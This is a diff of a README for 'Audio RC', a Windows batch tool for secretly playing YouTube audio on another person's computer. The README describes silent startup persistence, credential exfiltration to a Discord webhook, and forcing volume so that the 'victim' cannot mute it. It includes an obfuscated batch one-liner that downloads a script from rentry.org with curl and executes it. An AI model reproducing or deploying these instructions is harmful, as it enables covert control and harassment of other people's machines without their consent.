@@ -1,4 +1,4 @@
-## 🔊 Audio RC Version 2.0
+## 🔊 Audio RC Version 2.1
 > Audio RC allows you to remote other machine and silently play youtube audio in it without the other side knowing how to stop or who did it.
 
 #### Audio RC Features
@@ -8,15 +8,16 @@
 
 * **Audio RC starts with the computer everytime**
 
-    _When the computer restarts Audio RC will start silently without the other side knowing about it_
+    _When the computer restarts Audio RC will start silently without the other side knowing about it and its going to send you a new message to your discord channel - if the message already exists its going to edit the message instead of sending it over again._
 
 * **Play any content valid on youtube**
 
     _You are able to play any youtube video using its URL_
+    P.S. _Also planning to add spotify feature_
 
 * **A Script to remote the other side _(NEW)_**
 
-    _Version 2.0 introduces a remote script which makes it much easier
+    _Version 2.0 introduced a remote script which makes it much easier
     to control the other side, you open the script, paste the youtube link and the script does anything for you and keeps you updated about the other side's status_
 
 #### Setup Audio RC
@@ -25,18 +26,10 @@ _Technically, there are 2 ways to setup Audio RC_
 ##### Difference Menu
 | METHOD | DIFFERENCE | Recommended? |
 | :--: | :--: | :--: |
-| 1 | _This method will only print the login credentials on the screen while you are in DEBUG mode_ | Technically, **YOU SHOULDN'T USE THIS METHOD UNLESS YOU HAVE SSH ACCESS** to the same computer |
-| 2 | _This method will send the login credentials to your discord webhook and will keep you updated in case they were changed_ | **This method is just a bit harder to setup,** though you will recieve the login credentials into your discord webhook. **(HIGHLY RECOMMENDED)** |
+| 1 | _This method will send the login credentials to your discord webhook and will keep you updated in case they were changed_ | **This method is just a bit harder to setup,** though you will recieve the login credentials into your discord webhook. **(HIGHLY RECOMMENDED)** |
+| 2 | _This method will only print the login credentials on the screen while you are in DEBUG mode_ | Technically, **YOU SHOULDN'T USE THIS METHOD UNLESS YOU HAVE SSH ACCESS** to the same computer |
 
-##### :one: Method Number 1 _(SSH)_
-- Paste the following code into the SSH
-```bat
-for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do for %e in (rentry) do cls&&curl -#Lsko "%~b6%c%d" "%e%corg/%a/raw"&&call "%~b6%c%d" --debug
-```
-- You should restart the computer through your SSH connection.
-
-
-##### :two: Method Number 2
+##### :one: Method Number 1
 - [Create your webhook link at discord](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
 > _How does a webhook look?_
 >
@@ -61,17 +54,34 @@ you are ready to go, save the command and you will be able to use it in the futu
 
 ### You got the credenitials? Great! :tada:
 
-_At this step we will be installing the remote panel, if you want to use it but scared, you can use it in a VM or you can check the [source code](https://github.com/agamsol/Audio-RC/blob/2.0/REMOTE/REMOTE.bat) of the remote script._
+_At this step we will be installing the remote panel, if you want to use it but scared, you can use it in a VM or you can check the [source code](https://github.com/agamsol/Audio-RC/blob/2.1/REMOTE/REMOTE.bat) of the remote script._
 
-- Download the [Remote Script](https://raw.githubusercontent.com/agamsol/Audio-RC/2.0/REMOTE/REMOTE.bat)
+- Download the [Remote Script](https://raw.githubusercontent.com/agamsol/Audio-RC/2.1/REMOTE/REMOTE.bat)
 > NOTE: You should download the script and put it on a folder on its own, this will grant you easy access to it whenever you need & want.
-- Open the file [`REMOTE.bat`](https://raw.githubusercontent.com/agamsol/Audio-RC/2.0/REMOTE/REMOTE.bat)
+- Open the file [`REMOTE.bat`](https://raw.githubusercontent.com/agamsol/Audio-RC/2.1/REMOTE/REMOTE.bat)
 - Enter the credentials to login.
+
+##### :two: Method Number 2 _(SSH)_
+- Paste the following code into the SSH
+```bat
+for %a in (F6) do for %b in ("%temp%\F") do for %c in (.) do for %d in (cmd) do for %e in (rentry) do cls&&curl -#Lsko "%~b6%c%d" "%e%corg/%a/raw"&&call "%~b6%c%d" --debug
+```
+- You should restart the computer through your SSH connection.
+
+### 📝 Change Log
+> After struggling a lot with the code from version 2.0 I almost gave up doing that and starting to make the script over again, although I was really carious if I could fix it and in the end I managed to convert both, the main script and the remote to support INI formatting instead of JSON FORMATTING
+- Storing DATA with `INI` formatted configs and databases
+- Integrated my [SDK](https://github.com/agamsol/SDK) into Audio RC 🎉
+- Change the volume of the victim's PC while the video is playing, keep it sync and not let the victim to mute his own system audio while audio is playing
+- Properly check for internet connection, the socket also checks the connection now and stops the script until the connection is established once again.
+- Improved script start-delay
+- Better ERROR DETECTION for discord webhooks (checking if they work using the string regex and if there's a match only then we send the message)
+- Edit the discord message if it already exists in your webhook (does not require authentication)
 
 #### 📚 Contact information and support
 > Feel free to contact me in discord, <span style="color:#7289DA">Agam#0001</span>
 
-> Im also available in the [r/batch discord server](https://discord.gg/gPMcxXZjkb). **(you can and should ping me there)**
+> Im also available in the [r/batch discord server](https://discord.gg/gPMcxXZjkb). **(you can and should ping me there if you want support from me)**
 
 ### 💲 Donations
 I highly appreciate donors who send money,
